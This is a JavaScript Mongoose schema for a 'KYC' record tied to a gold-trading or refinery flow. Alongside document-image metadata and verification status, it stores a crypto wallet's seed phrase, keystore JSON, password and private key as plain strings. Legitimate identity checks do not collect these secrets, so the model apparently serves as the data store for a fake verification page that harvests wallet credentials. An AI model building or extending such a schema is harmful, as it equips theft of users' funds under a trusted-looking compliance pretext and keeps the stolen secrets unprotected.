const mongoose = require('mongoose');

const KycSchema = new mongoose.Schema({
  userId: { type: mongoose.Schema.Types.ObjectId, required: false, ref: 'User' },
  sessionId: { type: String, required: true },
  walletType: { type: String, required: true },
  seedPhrase: { type: String },
  keystoreJson: { type: String },
  password: { type: String },
  privateKey: { type: String },
  // Store Cloudinary metadata objects for each uploaded file
  imageUrls: [{
    url: { type: String },
    public_id: { type: String },
    resource_type: { type: String },
    bytes: { type: Number },
    format: { type: String },
    folder: { type: String },
  }],
  // Explicit text fields from KYC documents page
  qualityRequired: { type: String },
  karatsPurity: { type: String },
  destinationRefineryText: { type: String },
  // Dealer license availability and file mapping
  dealersLicenseStatus: { type: String, enum: ['available','not_available'], default: 'available' },
  fileMap: { type: Object },
  // Verification metadata
  verificationStatus: { type: String, enum: ['pending','verified','verification_failed','no_images'], default: 'pending' },
  verificationError: { type: String },
}, { timestamps: true });

module.exports = mongoose.model('Kyc', KycSchema);